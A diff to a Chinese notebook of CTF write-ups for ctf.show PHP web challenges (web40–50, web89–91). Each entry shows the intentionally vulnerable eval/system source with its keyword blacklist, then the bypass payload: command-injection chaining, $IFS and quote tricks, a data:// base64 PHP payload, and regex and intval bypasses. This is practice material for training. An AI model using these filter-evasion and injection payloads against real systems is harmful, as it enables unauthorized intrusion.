@@ -1538,11 +1538,11 @@ ${phpinfo()}
 
 ![image-20210507103243907](CTF刷题WriteUp.assets/image-20210507103243907.png)
 
-​
+
 
 ![image-20210507103345039](CTF刷题WriteUp.assets/image-20210507103345039.png)
 
-​
+
 
 ### \[SUCTF 2019]EasySQL 1
 
@@ -1731,13 +1731,13 @@ flag位置
 
 > 思路：先用线索构造flag所在位置的md5值
 >
-> ​ fllllllllllllag：md5值 594cb6af684ad354b4a59ac496473990
+>  fllllllllllllag：md5值 594cb6af684ad354b4a59ac496473990
 >
-> ​ cookie\_secret+md5(filename)：md5值
+>  cookie\_secret+md5(filename)：md5值
 >
-> ​ cookie\_secret没找到，百度一下吧，唉，原来是模板注入，提示在/welcome.txt里面，render
+>  cookie\_secret没找到，百度一下吧，唉，原来是模板注入，提示在/welcome.txt里面，render
 >
-> ​ 36277246-f3aa-4cea-a784-115ecefa55a2+594cb6af684ad354b4a59ac496473990.后来发现原来filename=/ fllllllllllllag，得加上/ 严谨啊
+>  36277246-f3aa-4cea-a784-115ecefa55a2+594cb6af684ad354b4a59ac496473990.后来发现原来filename=/ fllllllllllllag，得加上/ 严谨啊
 >
 > md5(36277246-f3aa-4cea-a784-115ecefa55a2+3bf9f6cf685a6dd8defadabfb41a03a1)最终得出flag
 
@@ -2189,7 +2189,7 @@ else{
 if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
 ```
 
-​ 这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话才能继续往下一步走，现在就剩下一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file\_get\_contents函数读取文件。构造如下，
+ 这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话才能继续往下一步走，现在就剩下一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file\_get\_contents函数读取文件。构造如下，
 
 ```php
 text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
@@ -6032,7 +6032,7 @@ if(isset($_GET['c'])){
 ?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
 ```
 
-### ctf\_show web39 。。。
+### ctf\_show web39 
 
 ```php
  <?php
@@ -6071,6 +6071,357 @@ base64编码并不能执行成功，原因应该是
 $c参数内容和.php内容拼接，导致base64不能解码成功
 
 > c=data://text/plain;base64,`PD9waHAgcGhwaW5mbygpOz8+.php`
+
+### ctf\_show web40
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 06:03:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
+        eval($c);
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+> ?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 
+
+### ctf\_show web41。。。
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: 羽
+# @Date:   2020-09-05 20:31:22
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:40:07
+# @email: 1341963450@qq.com
+# @link: https://ctf.show
+
+*/
+
+if(isset($_POST['c'])){
+    $c = $_POST['c'];
+if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){ //小写英文字母也被过滤了
+        eval("echo($c);");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?> 
+
+~~~
+
+> payload: 利用或运算构造字符绕过限制
+>
+> https://blog.csdn.net/miuzzx/article/details/108569080
+
+
+
+### ctf\_show web42
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 20:51:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    system($c." >/dev/null 2>&1");
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> payload:
+>
+> 题目把传入的值，执行的标准输出和错误输出的结果都丢弃掉
+>
+> `;`   `||`  `&`   `&&` 等符号都可以绕过
+>
+> cat flag.php ; 
+
+### ctf\_show web43
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+
+~~~
+
+> payload:
+>
+> ?c=more flag.php||
+
+### ctf\_show web44
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:01
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/;|cat|flag/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> payload:
+>
+> ?c=more fla*||
+
+### ctf\_show web45
+
+~~~php
+
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:35:34
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| /i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> payload:
+>
+> ?c=more\$IFS$1fla*||
+
+### ctf\_show web46
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:50:19
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> ?c=more<fla''g.php||
+
+### ctf\_show web47
+
+
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:59:23
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+    
+~~~
+
+> c=nl<fla''g.php||
+
+### ctf\_show web48
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:06:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+
+
+> c=nl<fla''g.php||
+
+### ctf\_show web49
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:22:43
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> payload:
+>
+> ?c=nl<fla''g.php||
+
+### ctf\_show web50...
+
+~~~php
+
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:32:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> ?c = nl<fla''g.php||
+
+
+
+
 
 ### ctf\_show web78
 
@@ -6205,3 +6556,109 @@ if(isset($_GET['file'])){
 ### ctf\_show web82 。。。
 
 > 利用条件竞争
+
+### ctf\_show web89
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 15:38:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+include("flag.php");
+highlight_file(__FILE__);
+
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if(preg_match("/[0-9]/", $num)){
+        die("no no no!");
+    }
+    if(intval($num)){
+        echo $flag;
+    }
+} 
+
+~~~
+
+> preg_match()函数：判断输入的值是否存在指定字符
+>
+> preg_match()函数一个漏洞 **无法处理数组**
+>
+> ?num[]=9
+
+### ctf\_show web90
+
+~~~php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:06:11
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['num'])){
+    $num = $_GET['num'];
+    if($num==="4476"){  
+        die("no no no!");
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+} 
+~~~
+
+> ?num=4476a
+
+### ctf\_show web91
+
+~~~php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:16:09
+# @link: https://ctfer.com
+
+*/
+
+show_source(__FILE__);
+include('flag.php');
+$a=$_GET['cmd'];
+if(preg_match('/^php$/im', $a)){
+    if(preg_match('/^php$/i', $a)){
+        echo 'hacker';
+    }
+    else{
+        echo $flag;
+    }
+}
+else{
+    echo 'nonononono';
+} 
+
+~~~
+
+> i表示大小写都匹配，m表示多行匹配。然后我们可以构建 ?cmd=php%0a1或者?cmd=%0aphp来表示因为缺少了多行的读取的能力就表示了他可以看成一行
